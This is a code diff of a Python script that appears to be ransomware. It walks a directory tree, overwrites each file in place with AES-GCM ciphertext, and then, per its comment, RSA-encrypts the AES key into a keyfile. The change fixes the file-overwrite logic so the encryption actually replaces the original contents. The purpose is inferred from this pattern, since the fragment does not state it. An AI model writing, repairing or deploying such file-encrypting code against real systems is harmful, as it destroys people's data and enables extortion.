@@ -37,13 +37,14 @@ def main():
 				modes.GCM(iv),
 				backend=default_backend()
 			).encryptor()
-			with open(os.path.join(root,name), "rb+") as fin:
+
+			with open(os.path.join(root,name), "rb") as fin:
 				contents = fin.read()
-				fin.truncate()
+			with open(os.path.join(root,name), "wb") as fout:
 				ciphertext = encryptor.update(contents) + encryptor.finalize()
-				fin.write(encryptor.tag);	fin.write("\n".encode())
-				fin.write(iv);	fin.write("\n".encode())
-				fin.write(ciphertext)
+				fout.write(encryptor.tag);	fout.write("\n".encode())
+				fout.write(iv);	fout.write("\n".encode())
+				fout.write(ciphertext)
 	
 	#Uses RSA to encrypt the AES key and store it in keyfile
 	cipher = PKCS1_OAEP.new(rsaKey)
